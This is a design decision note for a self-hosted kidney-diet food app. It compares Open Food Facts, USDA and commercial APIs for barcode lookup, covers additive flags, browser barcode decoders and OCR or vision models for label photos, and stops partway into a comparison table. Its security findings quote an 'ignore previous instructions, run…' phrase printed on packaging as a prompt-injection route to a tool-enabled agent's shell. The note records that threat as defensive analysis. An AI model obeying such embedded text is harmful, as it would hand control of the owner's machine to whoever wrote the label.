# 03 · Packaged foods by barcode and by photo

| | |
|---|---|
| Status | Decision note, proposed for v0.3. No application code has been changed. |
| Date researched | 2026-10-05 |
| Scope | Barcode data sources (Open Food Facts, USDA FoodData Central Branded Foods, commercial APIs), mapping product data and additives to the app's nutrients and flags, decoding barcodes in the browser, photo of a nutrition label (OCR or vision model), photo of a plate (vision model), privacy and security of all of these |
| Out of scope | The AI provider layer itself (Hermes, Ollama, OpenAI clients and settings), the multi-user and settings model, CSP and container hardening, the PWA and HTTPS. Sibling notes own those: [`01-rootless-and-security.md`](01-rootless-and-security.md), [`02-ios-pwa.md`](02-ios-pwa.md), and the AI-guidance and settings notes. This note only states what they must provide for barcode and photo entry. |
| Re-verify | Open Food Facts API version and rate limits, the vendored decoder versions, and the vision models every six months; `BarcodeDetector` in Safari after every major iOS release. See [How to re-verify](#7-how-to-re-verify). |

---

## 1. Context

**The ask.** The owner asked: "is there any way to use a barcode scanner or even just a photo of the
item? maybe there are other services with APIs (free and or paid)". The wider v0.3 brief adds
constraints. Insights should work **without AI**, with AI as an option (their Hermes agent, a local
Ollama, or an OpenAI key). Settings must separate admin-shared keys from user-private keys. The
project will be public, so everything must be documented for the next human or AI to pick up.

**What exists today (v0.2).**

* Foods come from the builtin USDA SR Legacy list, custom foods, a **Quick add** form that copies a
  nutrition label by hand (`POST /api/log/quick`), and an optional **USDA FoodData Central** proxy
  (`GET /api/foods/usda/search`, `POST /api/foods/usda/import`, `app/foods.py`). The USDA key is
  sent as an `X-Api-Key` header, never in a URL.
* `foods.source` is one of `builtin`, `usda`, `custom` (`app/nutrients.py::FOOD_SOURCES`). There is
  **no barcode column**.
* Flags (`app/nutrients.py::FLAGS`): `phosphate_additive`, `high_gi`, `counts_as_fluid`,
  `avoid_ckd`, `hypo_treatment`, `low_potassium_fruit`, `processed`. `phosphate_additive` turns the
  phosphorus warning **high** whatever the number says. There is **no potassium-additive flag**.
* A missing nutrient is stored as `null` (unknown), never 0. The USDA importer already adds the note
  "treat it as unknown, not zero".
* Log entries keep a **nutrient snapshot**. That makes "may we store the provider's nutrient values
  indefinitely?" a hard requirement for any data source.
* The UI is vanilla JS with **no build step, no CDN and no external requests from the browser**. It
  renders only with `textContent` (`app.js` has no `innerHTML`). The server "makes no external
  requests unless you enable USDA lookups" (README).
* The README roadmap already lists "Barcode lookup via Open Food Facts for packaged foods, with the
  phosphate-additive flag set from the ingredient list."
* `docs/diet-guide.md` §5 already teaches label reading. It says to look for "PHOS" and potassium
  additives ("additive potassium is ~90 % absorbed"). The app should do automatically what the guide
  tells the patient to do by eye.

**Constraints from the sibling notes.**

* Note 01 plans a strict CSP: `script-src 'self'`, `require-trusted-types-for 'script'`,
  `trusted-types kh-sw` (a single policy that allows only `/sw.js`; it was `'none'`, which the
  security review corrected because it blocks service-worker registration), `connect-src 'self'`. It also plans a body-size limit, admin-only AI base
  URLs, and keys stored encrypted and write-only. It says "if the barcode note picks a WebAssembly
  decoder, add `'wasm-unsafe-eval'`".
* Note 02 found that `BarcodeDetector` does not exist on iOS. It chose the `barcode-detector` 3.2.2
  ponyfill with a vendored `zxing-wasm` 3.1.3 reader for live scanning. It notes that live camera
  needs HTTPS while `<input type="file">` photos do not. It left the server-side decode decision to
  this note.

---

## 2. Findings

### F1. Open Food Facts (OFF) product API

**Versions and the endpoint to use.**

* OFF documents **v3 as current (latest v3.6)** and **v2 as deprecated**
  ([API docs](https://openfoodfacts.github.io/openfoodfacts-server/api/),
  [source](https://github.com/openfoodfacts/openfoodfacts-server/blob/main/docs/api/index.md)).
* The [schema change log](https://github.com/openfoodfacts/openfoodfacts-server/blob/main/docs/api/ref-api-and-product-schema-change-log.md)
  says **API 3.5 (product schema 1003) replaced the nutrition facts structure** and that it is
  "still currently under active development". API 3.6 (2026-05-27) also reworked the `*_tags`
  fields. Lower API versions are converted back to the older schema on the fly.
* **Measured on 2026-10-05** with the same Nutella barcode and `fields=…,nutriments,nutrition`:

  | Request | `schema_version` | `nutriments` | New `nutrition` object |
  |---|---|---|---|
  | `/api/v2/product/…` | 998 | flat, filled | no |
  | `/api/v3/product/…` | 999 | flat, filled | no |
  | `/api/v3.4/product/…` | 1002 | flat, filled | no |
  | `/api/v3.5/product/…`, `/api/v3.6/product/…` | 1003 / 1004 | **`{}` (empty)** | `nutrition.aggregated_set.nutrients.<name>.{value,unit,source,source_per}` + `input_sets[]` |

  So a client written against the classic `nutriments` object **silently gets no nutrients** from
  v3.5 and later. **Pin `/api/v3.4/`**, and keep a second parser for `nutrition.aggregated_set`
  ready for when OFF declares schema 1003+ stable.
* **Not found:** HTTP **404** with `{"status":"failure","result":{"id":"product_not_found"}}`.
  Found: `{"status":"success","result":{"id":"product_found"},"product":{…}}`.
* **Staging:** `https://world.openfoodfacts.net` (HTTP Basic `off`/`off`) for development.

**Identification and rate limits** ([API docs](https://openfoodfacts.github.io/openfoodfacts-server/api/)):

* "Always use a custom User-Agent… in the form of `AppName/Version (ContactEmail)`". Reads need no
  key.
* **15 req/min/IP for product reads.** 10 req/min/IP for search, and "don't use it for a
  search-as-you-type feature, you would be blocked very quickly". Exceeding these risks an **IP
  ban**, and there are also global limits that answer **503**. "If your requests come from your
  users directly (ex: mobile app), the rate limits apply per user". Our server proxies, so **one
  budget is shared by everyone on an instance**.
* For more than "a few hundred products", OFF asks you to use the dumps or run your own Product
  Opener instance. OFF also asks API users to fill in a usage form.

**Barcode normalisation**
([reference](https://github.com/openfoodfacts/openfoodfacts-server/blob/main/docs/api/ref-barcode-normalization.md)).
OFF pads codes of 9–12 digits to 13 and codes of ≤ 7 digits to 8, and the API normalises the code
you pass. It does **not** expand UPC-E. UPC-E must be converted to UPC-A first (F6).

**Fields and units**
([`product_nutrition.yaml`](https://github.com/openfoodfacts/openfoodfacts-server/blob/main/docs/api/ref/schemas/product_nutrition.yaml)).

* `<n>_100g` and `<n>_serving` are normalised to a **standard unit**: g for every nutrient measured
  by weight (so sodium, potassium, phosphorus and calcium are **grams**), kcal for `energy-kcal`, and
  per 100 mL for liquids. The schema says to use these fields.
* `<n>_value` and `<n>_unit` are "as entered by the contributor" and should not be used.
* A `_prepared` infix (`potassium_prepared_100g`) holds values for the product **as prepared**. Some
  products have only prepared values: Kraft mac & cheese `0021000658831` returned only
  `*_prepared_*`.
* `nutrition_data_per` is `100g` or `serving`. `no_nutrition_data: "on"` means the package shows no
  nutrition table.
* `serving_size` is free text (`"1 can (354.9 mL)"`). `serving_quantity` is a number (it is a
  string in the parquet dump, so parse defensively) with `serving_quantity_unit` `g` or `ml`.
* **Salt:** OFF derives salt and sodium from each other (salt = sodium × 2.5; `salt_modifier: "~"`
  marks a computed value).
* **Carbohydrate is ambiguous.**
  * The schema says `carbohydrates` is *available* carbohydrate (fibre excluded) and
    `carbohydrates-total` is the US/Canada definition.
  * But in API 3.4, US products hold the label's **Total Carbohydrate** in `carbohydrates`. Lay's
    `0028400090858` has `carbohydrates_serving` 15 g with fibre 1 g, exactly the US label's total.
  * `carbohydrates-total` exists on only **0.2 %** of US products (7.5 % of popular ones), so in
    practice `carbohydrates` means "the label's carbohydrate line".
* `ingredients_text` is free text in the product's language. `additives_tags` holds normalised
  E-number tags such as `en:e451`, `en:e451i`, `en:e338`.
  * Kraft: `en:e451`, `en:e451i` from "SODIUM TRIPHOSPHATE … CALCIUM PHOSPHATE, SODIUM PHOSPHATE".
  * Diet Coke `0049000028911`: `en:e338` (phosphoric acid) and `en:e212` (potassium benzoate).
  * Tags are derived from parsed ingredients, so a product with no parsed ingredients has no tags.
* OFF itself warns: "there are no assurances that the data is accurate, complete, or reliable."

**How often the fields we need are present.** I measured this on the OFF Parquet dump on
Hugging Face (`openfoodfacts/product-database`, `food.parquet`, commit `301eed3`, 2026-10-05,
4,779,997 products), with DuckDB reading only the needed columns. "Present" means a `_100g`,
`_serving` or `_prepared_100g` value exists. "Popular" means at least 10 unique scans.

| Slice | Products | Energy | Sodium | **Potassium** | **Phosphorus** | Serving size | Phosphate-additive tag¹ | Bulk K-additive tag¹ |
|---|---:|---:|---:|---:|---:|---:|---:|---:|
| US, all | 979,525 | 87 % | 80 % | **28 %** | **7 %** | 65 % | 5.0 % | 1.2 % |
| US, popular | 3,298 | 96 % | 93 % | **69 %** | **49 %** | 90 % | 10.1 % | 3.5 % |
| Rest of world, all | 3,800,472 | 69 % | 59 % | 8 % | 7 % | 24 % | 1.6 % | 0.5 % |
| Rest of world, popular | 72,073 | 94 % | 92 % | 38 % | 40 % | 54 % | 5.3 % | 2.0 % |

¹ Lower bounds. A tag exists only when the ingredient list was entered and parsed. The real share
of processed foods with phosphate additives is far higher, and the app must also scan
`ingredients_text` itself (R5).

Takeaways:

* Sodium and energy are usually there.
* **Potassium is missing for most products**:
  * the US made potassium mandatory on the Nutrition Facts label only from 2020–2021
    ([FDA](https://www.fda.gov/food/nutrition-facts-label/changes-nutrition-facts-label));
  * EU labels must declare energy, fat, saturates, carbohydrate, sugars, protein and **salt**, with
    potassium and phosphorus optional
    ([Regulation (EU) 1169/2011](https://eur-lex.europa.eu/eli/reg/2011/1169/oj)).
* **Phosphorus is missing almost everywhere.** It is voluntary on US labels too.
* So the UI must **show "unknown" loudly**, never 0. The additive flags matter more than the
  numbers.

**Licence obligations** ([terms of use](https://world.openfoodfacts.org/terms-of-use),
[ODbL 1.0](https://opendatacommons.org/licenses/odbl/1-0/)).

* The database is under **ODbL**, individual contents under **DbCL**, and images under
  **CC BY-SA**.
* Re-users "have to mention the licence and to attribute the authorship to Open Food Facts with a
  link to https://openfoodfacts.org … or the product page".
* ODbL §4.3: a publicly used Produced Work needs a notice such as "Contains information from
  DATABASE NAME, which is made available here under the Open Database License (ODbL)".
* ODbL §4.4 is share-alike for a publicly used Derivative Database.
* ODbL §4.6 can be met by offering "the method of making the alterations to the Database (such as
  an algorithm)". Our mapping code is public, so linking to it satisfies this.
* "Publicly" means people other than you or those under your control. A private homelab instance
  is not public use. A multi-user instance open to strangers is.

### F2. Additives that matter for a kidney diet

The app already treats any phosphate additive as high phosphorus, because additive phosphorus is
about 90–100 % absorbed (`docs/research/ckd-diet.md`). The evidence for **potassium** additives is
just as concrete:

* **Parpia et al. 2018** analysed 91 meat, poultry and fish products chemically. Products listing a
  potassium additive had **900 mg K/100 g (750–1,100)**, against 325 mg for those without and
  420 mg for additive-free references
  ([J Ren Nutr 28:83](https://doi.org/10.1053/j.jrn.2017.08.013)).
* **Sherman & Mehta 2009** found enhanced raw meat and poultry up to **930 mg K/100 g**. **8 of 25
  enhanced products did not list the additives**
  ([CJASN 4:1370](https://doi.org/10.2215/CJN.02830409)).
* **Picard 2019**: potassium additives are more bioavailable than food potassium
  ([J Ren Nutr 29:350](https://doi.org/10.1053/j.jrn.2018.10.003)). KDIGO 2024 Figure 33 puts
  additive potassium at about 90 % absorbed (already cited in the diet guide).
* Two 2026 reviews call for additive-aware guidance:
  [Bernier-Jean et al.](https://doi.org/10.1016/j.semnephrol.2026.151727) and
  [Lambert et al.](https://doi.org/10.1016/j.semnephrol.2026.151728) (Semin Nephrol).

The E-numbers fall into tiers by **how much** mineral they add. Bulk salts are used at percent
levels, as salt replacers, curing brines and phosphate blends. Preservatives, sweeteners and flavour
enhancers are used at parts-per-million. The potassium mass fractions below are stoichiometry:
potassium sorbate is 26 % K, so at a common 0.1 % use level it adds about 26 mg K per 100 g;
acesulfame K is 19.4 % K, potassium benzoate 24.4 %.

**Phosphate additives → existing flag `phosphate_additive`:**

| E-number | Substance(s) | Notes |
|---|---|---|
| E338 | Phosphoric acid | Colas |
| E339 (i–iii) | Sodium phosphates | |
| E340 (i–iii) | Potassium phosphates | **also** potassium |
| E341 (i–iii) | Calcium phosphates | Fortified plant milks, cereals |
| E343 (i–ii) | Magnesium phosphates | |
| E450 (i–iii, v–vii, ix) | Diphosphates (SAPP, tetrasodium/tetrapotassium pyrophosphate…) | (v) is also potassium |
| E451 (i–ii) | Triphosphates | (ii) is also potassium |
| E452 (i–iv) | Polyphosphates (incl. hexametaphosphate) | (ii) is also potassium |
| E541 | Sodium aluminium phosphate | US baking powder, processed cheese |
| E542 | Edible bone phosphate | rare |

**Phosphates at trace levels → note only, no flag:** E1410, E1412, E1413, E1414 and E1442
(starch phosphates), and E442 (ammonium phosphatides).

**Potassium additives, bulk → new flag `potassium_additive` (R5):** E508 potassium chloride
(**and `avoid_ckd` when it is the main ingredient, i.e. a salt substitute**), E326 lactate,
E332 citrates, E261 acetates, E340 phosphates, E450(v), E451(ii), E452(ii), E501 carbonates,
E351 malate, E336 tartrates (cream of tartar), E337, E357 adipate, E577 gluconate, E622 glutamate,
E525 hydroxide, E515 sulphates, E402 alginate, E283 propionate.

**Potassium additives, trace → note only:** E202 sorbate, E212 benzoate, E224 metabisulphite,
E228 hydrogen sulphite, E249 nitrite, E252 nitrate, E536 ferrocyanide, E555, E522, E628, E632,
E950 acesulfame K, E954(iv) potassium saccharin, potassium iodide/iodate (iodised salt).

**US labels name substances, not E-numbers.** OFF maps names to tags when it parses the ingredient
list, but FDC gives only the raw `ingredients` string. The app therefore needs its own text scan:
"phosph…/fosf…", but **not** "phosphatidyl…/phospholipid", plus "(mono|di|tri|tetra|penta)potassium
…", "potassium chloride", "cream of tartar", "salt substitute", and the localised words "kalium",
"potasio", "potassio", "potássio". A missing additive is not proof of absence (Sherman: 8 of 25
products did not list theirs).

### F3. USDA FoodData Central, Branded Foods

* **Licence:** public domain, **CC0 1.0**. Citation requested ([API guide](https://fdc.nal.usda.gov/api-guide/)).
* **Key:** an api.data.gov key, sent as `X-Api-Key` (the app already does this). The guide says
  **1,000 requests per hour**. `DEMO_KEY` is documented at 30/hour and 50/day, but on 2026-10-05 it
  answered `x-ratelimit-limit: 10` and then `OVER_RATE_LIMIT` after three calls, so **treat
  DEMO_KEY as unusable**.
* **Search by barcode.** The help page says users can search "by the name of the food or the GTIN
  number", via `GET /v1/foods/search?query=<GTIN>&dataType=Branded`. Results carry `gtinUpc`.
  * My one test (`049000028911`, Diet Coke 12 oz) returned `totalHits: 0`.
  * So the search is **best effort**. Try the 12-digit, 13-digit and 14-digit forms, and accept a
    hit only when its `gtinUpc`, normalised to GTIN-14, equals ours exactly.
* **Branded record** (`GET /v1/food/{fdcId}`,
  [OpenAPI](https://fdc.nal.usda.gov/api-spec/fdc_api.yaml)):
  * descriptive fields: `gtinUpc`, `brandOwner`, `brandedFoodCategory`, `ingredients`;
  * serving: `servingSize` + `servingSizeUnit` (g or ml), `householdServingFullText`;
  * `foodNutrients` **per 100 g**, so the existing nutrient-number mapping works;
  * `labelNutrients` per serving: fat, saturatedFat, transFat, cholesterol, sodium,
    carbohydrates, fiber, sugars, protein, calcium, iron, potassium, calories.
  * There is **no phosphorus** in `labelNutrients`.
  * The spec spells potassium as **`postassium`**, so accept both keys.
* Branded data is updated **monthly**. It comes from manufacturers, so for US products it is
  usually more trustworthy than crowd-sourced data. It does not cover non-US products.

### F4. Commercial food APIs (checked 2026-10-05)

The app's nutrient snapshot means we must be allowed to **store the nutrient values** we show and
log.

| Provider | Free tier | Paid entry | Barcode | Storing data | Attribution | K / P | Fit |
|---|---|---|---|---|---|---|---|
| **Nutritionix** (Syndigo) | None in public: "we are no longer able to maintain a public free-access tier" ([dev portal](https://developer.nutritionix.com/)). A free "Business Trial" for up to 2 MAU via sales | Starter **$499/mo** (≤ 200 MAU), MVP $999 (≤ 1,000), Unicorn from $1,850, billed annually ([pricing](https://www.nutritionix.com/api)) | All plans | "Caching Allowed": **no** on Trial and Starter; yes on MVP and Unicorn, "for historical reference purpose only" | Required (removable on Unicorn) | Label values for branded | **No**: price per user, and cannot cache on the affordable plans |
| **Edamam** Food Database | 30-day trial | Basic **$14/mo** (100,000 calls/mo, 50 UPC req/min), Core $69, Plus $299 ([pricing](https://developer.edamam.com/food-database-api)) | 790,000 UPCs | Basic may cache only **FoodId and label**; Core/Plus add protein, net carbs, fat, kcal; full caching is an add-on | "Powered by Edamam" badge on all plans ([rules](https://developer.edamam.com/attribution)); their badge is a CDN script | UPC foods "as listed on their nutrition label" | **No**: cannot store K/P/Na, and the badge script conflicts with no-CDN |
| **FatSecret** Platform | Basic: **5,000 calls/day**, US data, barcode included; Premier Free (startups/non-profits, verified) unlimited ([editions](https://platform.fatsecret.com/api-editions)) | Premier on request | `food.find_id_for_barcode` v2, GTIN-13, OAuth 2 scope `barcode` | "**The only storable values** returned by this call are food_id and serving_id" ([docs](https://platform.fatsecret.com/docs/v2/food.find_id_for_barcode)) | Required on free tiers | potassium yes, **no phosphorus field** | **No**: cannot store nutrients. Token requests come only from **whitelisted IPs**, which breaks homelabs on dynamic IPs |
| **Spoonacular** | 50 points/day | Cook $29/mo, Culinarian $79, Chef $149 ([pricing](https://spoonacular.com/food-api/pricing)) | UPC product lookup | Cache "for a maximum of 1 hour", only "with prior written permission", and delete everything when you stop ([terms](https://spoonacular.com/food-api/terms)) | Backlink on free | varies | **No**: 1-hour cache |
| **Passio** Nutrition-AI | none | Starter **$99/mo** (1 M tokens; "one photo … 20–30k tokens"), Growth $599, Pro $2,999 ([pricing](https://www.passio.ai/pricing)) | Barcode and label scanning (SDK oriented) | n/a | n/a | 2.5 M foods | **No** for v0.3: photos go to a third party, priced per token |
| **LogMeal** | 30-day trial (≤ 200 queries, 5 users) | Credit-based, 1 credit per image, ≤ 20 images/day/user; prices only render via JavaScript ([pricing](https://logmeal.com/api/pricing/)) | "supported barcode workflow" | n/a | n/a | dish-level | **No** for v0.3: same privacy issue |

None of the commercial APIs is both affordable for a self-hosted, non-commercial project and allows
the indefinite storage that log snapshots need. **OFF + USDA cover the use case at no cost**, with
licences that allow storage.

### F5. Decoding barcodes in the browser

**`BarcodeDetector` support** (MDN browser-compat-data **8.1.4**, 2026-10-01):

| Browser | Support |
|---|---|
| Chrome Android 83+, Samsung Internet 13+ | Yes |
| Chrome / Edge desktop | **macOS and ChromeOS only** (partial) |
| Safari macOS and iOS 17+ | **Behind a flag only** |
| WebView iOS (every iOS browser) | No |
| Firefox | No |

[WebKit bug 281848](https://bugs.webkit.org/show_bug.cgi?id=281848) "Shape Detection API doesn't
work on iOS" is still **NEW** (last change 2026-07-21). On iPhone we must ship a decoder.

Other APIs we rely on:

* `getUserMedia` needs a **secure context** (note 02 F9).
* `<input type="file" capture>`: iOS 10+, Chrome Android 25+, ignored on desktop.
* `createImageBitmap`: Safari 15+.
* WebAssembly: everywhere since 2017. CSP `'wasm-unsafe-eval'`: Safari 16, Chrome 97, Firefox 102.
* WebAssembly, `createImageBitmap` and file inputs **do not** need a secure context. So **decoding
  a still photo works over plain `http://lan:8000`**. Only the live viewfinder needs HTTPS.

**Libraries** (npm metadata 2026-10-05; sizes from the published tarballs):

| Package | Version (date) | Licence | What ships | EAN-13/8, UPC-A/E | Still photo / live | Maintenance | Verdict |
|---|---|---|---|---|---|---|---|
| **`barcode-detector`** (ponyfill) | **3.2.2** (2026-08-16) | MIT | `dist/iife/ponyfill.js` 43,933 B (15 KB gz). Pins `zxing-wasm` **3.1.3** | yes | both. Same API as native `BarcodeDetector` | 5 releases in 2026 | **Chosen** (as in note 02) |
| `zxing-wasm` (reader) | 3.1.3 (2026-08-14); 3.1.4 (2026-09-10) | MIT, wraps ZXing-C++ (Apache-2.0) | `zxing_reader.wasm` **1,093,289 B** (459 KB gz) for 3.1.3; 953,527 B for 3.1.4 | yes | both | active | Comes with the ponyfill. Do not mix 3.1.4's WASM with the 3.1.3 glue |
| `@zxing/browser` + `@zxing/library` | 0.2.1 (2026-07-06) / 0.23.0 (2026-04-29) | MIT / Apache-2.0 | UMD 441 KB / 362 KB (108 KB gz), pure JS | yes | both | revived in 2026 after 2 years idle | Fallback only: slower pure-JS port |
| `@ericblade/quagga2` | 1.12.1 (2025-12-20) | MIT | 157 KB min | 1D only (EAN/UPC yes) | both | active | Weaker on blurred or rotated photos than ZXing-C++ |
| `html5-qrcode` | 2.3.8 (**2023-04-15**) | Apache-2.0 | 375 KB min | yes | both | **unmaintained** | No |
| `@undecaf/zbar-wasm` | 0.11.0 (2024-05-22) | **LGPL-2.1+** | WASM | yes | both | stale | No (licence and staleness) |

**What I tested.** In Node 22, with the vendored `zxing-wasm` 3.1.3 reader WASM (SHA-256
`2ebda08a…c6d1ba`, which equals the `ZXING_WASM_SHA256` constant inside `ponyfill.js`):

| Input | `format` | `text` |
|---|---|---|
| UPC-A `049000028911` | `EAN13` | `0049000028911` (13 digits) |
| UPC-E `01234565` | `UPCE` | **`0012345000065`** (already expanded to 13 digits) |
| EAN-8 `96385074` | `EAN8` | `96385074` |

* A 1600×1200 JPEG of that UPC-A, rotated 12°, Gaussian-blurred and noised at quality 60, decoded
  correctly in **65 ms**.
* So the **same product arrives as 12, 13 or 8 digits** depending on the decoder. Native
  detectors typically report `upc_a` with 12 digits and `upc_e` with 8 (not tested here).
  Normalisation must happen in one place, on the server (R2).

**CSP and Trusted Types.**

* The ponyfill IIFE has **no `eval`, no `new Function`, no `Worker`, no `importScripts` and no
  script injection**. It calls `fetch` for the WASM, which `connect-src 'self'` allows, and
  `WebAssembly.instantiate`, which needs `'wasm-unsafe-eval'`.
* By default it fetches the WASM from `fastly.jsdelivr.net`. Override this with
  `prepareZXingModule({ overrides: { locateFile } })`.
* Note 02 suggested *lazy-loading* the IIFE by injecting a `<script>`. Under note 01's
  `require-trusted-types-for 'script'` + `trusted-types kh-sw` (whose only policy accepts
  `/sw.js`), setting `script.src` from JavaScript **throws** in Chromium and in Safari 26. Load the 15 KB-gzipped IIFE with a **static `<script defer>`
  tag** instead. The 1 MB WASM is still fetched lazily, on the first `detect()` call.

**Hardware scanners.** Cheap USB and Bluetooth barcode scanners act as keyboards: they type the
digits and press Enter. A plain "Type the barcode" field that submits on Enter supports them with no
extra code.

### F6. GTIN normalisation and codes that must not be looked up

* **GS1 check digit** (mod 10, weights 3/1 from the right). Reject a bad check digit before any
  network call.
* **UPC-E → UPC-A** expansion is a fixed table on the 6 middle digits (last digit 0–2, 3, 4,
  5–9). Expand only when the code is 8 digits **and** the decoder said `upc_e`, because an 8-digit
  code may also be EAN-8.
* Store **GTIN-14** (zero-padded) as the key. Send OFF the 13-digit form (or 8 for EAN-8).
* **Special GS1 prefixes** ([GS1 prefixes](https://www.gs1.org/prefixes)):

  | Prefix | Meaning | What the app does |
  |---|---|---|
  | **020–029, 040–049, 200–299** | Restricted circulation: in-store codes for weighed deli, meat and produce, unique only within a store or company | **Never look up** (a lookup would return a stranger's product). Say "store barcode for a weighed item, enter it by hand" |
  | 977 | Periodicals (ISSN) | Reject |
  | 978–979 | Books (ISBN) | Reject |
  | 98x, 99 | Coupons and receipts | Reject |
  | 050–059 | Reserved by GS1 US (formerly UPC coupons) | Reject |

### F7. Photo of a nutrition label

1. **Tesseract.js 7.0.0** (2025-12-15, Apache-2.0, in the browser).
   * Vendoring it means `tesseract.min.js` 63 KB, `worker.min.js` 111 KB,
     `tesseract-core-simd-lstm.wasm.js` 3.9 MB and `eng.traineddata` (`4.0.0_best_int`, 2.95 MB
     gzipped). That is about **7 MB**.
   * Its defaults fetch the worker, core and language data from **jsDelivr**. All three can be
     overridden.
   * It starts `new Worker(workerPath)`, and the worker runs `importScripts(corePath)`. Under note
     01's Trusted Types policy, both are blocked string sinks. It would need a named Trusted Types
     policy and a relaxed CSP on the worker script.
   * It returns text, not structure. Labels are tables with glare, curves and columns, and **layout
     is the hard part**. OFF's own pipeline, Robotoff, runs regexes over **Google Cloud Vision**
     OCR rather than Tesseract ([OFF wiki](https://wiki.openfoodfacts.org/OCR),
     [nutrition extraction project](https://wiki.openfoodfacts.org/Nutrition_facts_table_data_extraction/GSoC)).
   * A misread "350 mg" → "35 mg" of potassium is a safety problem.
2. **Server-side Tesseract** (Debian `tesseract-ocr` + `pytesseract` 0.3.13, last release
   2024-08).
   * It adds tens of MB and C image parsers to a hardened, read-only, ideally distroless image
     (note 01).
   * It parses untrusted images inside the server process.
   * Its accuracy has the same layout problem as option 1.
3. **Vision LLM through an OpenAI-compatible API.**
   * **OpenAI:** current models all accept images. The cheapest, `gpt-6-luna`, costs **$0.10 /
     $0.50 per M tokens** (input/output), supports Chat Completions and Structured Outputs
     ([model page](https://developers.openai.com/api/docs/models/gpt-6-luna)). A photo of a few
     thousand tokens costs well under a cent.
     * API data is "not used to train or improve OpenAI models" by default.
     * Abuse-monitoring logs are "retained for up to 30 days".
     * Zero Data Retention needs approval from sales
       ([your data](https://developers.openai.com/api/docs/guides/your-data)).
   * **Ollama:** the `/v1/chat/completions` compatibility layer accepts **base64 `data:` images**
     but **not image URLs**, and accepts `response_format`. It defaults to
     `http://localhost:11434/v1/` and ignores the key
     ([docs](https://docs.ollama.com/api/openai-compatibility)). Vision models on 2026-10-05
     ([library](https://ollama.com/search?c=vision)):

     | Model (Ollama tag) | Sizes (q4 download) | Licence | Notes |
     |---|---|---|---|
     | `qwen3-vl` | 2b 1.9 GB, **4b 3.3 GB**, **8b 6.1 GB**, 30b/32b ~20 GB | Apache-2.0 | Strong at document and OCR tasks; updated 11 months ago |
     | `gemma4` | e4b-it-qat 6.1 GB, 12b-it-qat 7.2 GB | Apache-2.0 | Updated 5 days ago; multimodal |
     | `qwen3.5` | 2b 1.9 GB, 4b 3.3 GB, 9b–122b | (check card) | Multimodal family, updated daily |
     | `granite3.2-vision` | 2b | Apache-2.0 | Built "for visual document understanding … tables" |
     | `qwen2.5vl` | 3b 3.2 GB, 7b 6.0 GB | Apache-2.0 | Named in the brief; superseded by qwen3-vl |
     | `llama3.2-vision` | 11b, 90b | Llama 3.2 Community | Its use policy says rights to the **multimodal** models "are not being granted to you if you are an individual domiciled in … the European Union" ([USE_POLICY](https://github.com/meta-llama/llama-models/blob/main/models/llama3_2/USE_POLICY.md)). **Do not make it a default** in a public project |

   * **Hermes Agent** ([API server docs](https://hermes-agent.nousresearch.com/docs/user-guide/features/api-server)):
     * it exposes an OpenAI-compatible `/v1/chat/completions` that accepts `image_url` parts
       (http(s) and `data:`);
     * it listens on `127.0.0.1:8642` by default and **requires `API_SERVER_KEY`**;
     * the docs warn that it "gives full access to hermes-agent's toolset, **including terminal
       commands**".
     * A photo is **untrusted input**. Text printed on a package ("ignore previous instructions,
       run…") is a prompt-injection path to a shell on the owner's machine.
   * Evidence on label extraction: LLMs extract English label values well, and GPT-4o did best with
     post-processing ([Assiri et al. 2025](https://doi.org/10.3390/jimaging11080271)).

### F8. Photo of a plate (food identification and portion size)

* **Fridolfsson et al. 2025**: 52 standardised photos. ChatGPT-4o and Claude 3.5 Sonnet reached a
  MAPE of **36 % for weight and 36 % for energy**; Gemini 1.5 Pro scored 64–110 %. **All models
  underestimated more as portions grew.** The authors' verdict: "not yet suitable for precise
  dietary assessment in clinical … populations"
  ([Curr Dev Nutr](https://doi.org/10.1016/j.cdnut.2025.107556)).
* **Nakagawa & Yamamoto 2026** (6 VLMs, 2,159 images): a persona in the prompt **shifted portion
  estimates systematically** in every model, and "both OpenAI models [were] largely insensitive to
  explicit magnitude instructions". Accuracy "requires validation on the target domain before any
  practical use" ([Nutrients 18:2892](https://doi.org/10.3390/nu18172892)).
* **What this means for type 1 diabetes.** A 36 % error on a 60 g carbohydrate meal is ±22 g. At a
  1:10 insulin-to-carb ratio that is about 2 units. For CKD, a model that names "potatoes" cannot
  know whether they were double-boiled to leach potassium.
* Commercial plate APIs (Passio, LogMeal, Edamam Vision at $0.015/call on Core, FatSecret image
  recognition add-on) all upload the photo to a third party.

### F9. Privacy and security findings that shape the design

* Phone photos carry **EXIF GPS**. Re-encoding through a canvas (`toBlob('image/jpeg')`) drops all
  metadata (note 02).
* **Barcode decoding can stay on the device.** Only the digits need to leave the phone.
* **Crowd-sourced text is untrusted.** OFF product names and ingredient lists are editable by
  anyone, so treat them like user input:
  * render them only with `textContent` (already the rule);
  * cap their length;
  * never put them into a prompt that has tools attached.
* **Upstream responses can be large or malformed.** Cap the response size, coerce types, and
  re-validate every number against `app/models.py` bounds (nutrients ≤ 1,000,000).
* **Do not use multipart for image uploads.** Starlette's `request.form()` (multipart) needs the
  extra `python-multipart` dependency and **spools parts over 1 MB to `/tmp`**. Note 01 makes `/tmp`
  a small tmpfs under a read-only rootfs. A raw `image/jpeg` request body read with a streaming
  byte cap avoids both.
* SSRF through a configurable AI base URL is handled by note 04 R5 (resolve, validate and pin
  every address; private targets only through the env-only `AI_PRIVATE_HOSTS` allowlist). The
  earlier reference to note 01's `ALLOW_PRIVATE_AI_HOSTS` was superseded (corrected in the security
  review).

---

## 3. Options compared

### 3.1 Where barcode data comes from

| Option | Cost / key | Coverage | K / P | Licence and storage | Verdict |
|---|---|---|---|---|---|
| **Open Food Facts** API 3.4 | Free, no key, 15 req/min/IP | 4.78 M products, worldwide (0.98 M US) | K 28 % US / 8 % world; P 7 % | ODbL: store and attribute | **Primary** |
| **USDA FDC Branded** | Free key, 1,000 req/h | US branded, manufacturer data, monthly | K when labelled; no P in `labelNutrients` | CC0 | **Second, when a key exists** |
| OFF + FDC merged per field | both | best of both | best of both | both | Only fill **gaps**. Never average |
| Nutritionix / Edamam / FatSecret / Spoonacular | $14–$1,850+/mo, or free with storage bans | large | label values | Storage restrictions conflict with snapshots | **Rejected** (F4). Keep a provider interface so a fork can add one |
| Local copy of the OFF dump | 7.9 GB parquet | everything, offline | same as API | ODbL share-alike on redistribution | Optional later for big instances. Not in the image |

### 3.2 Decoder in the browser

| Option | iOS | Size | CSP / TT | Licence | Verdict |
|---|---|---|---|---|---|
| Native `BarcodeDetector` only | No | 0 | fine | n/a | Use when present |
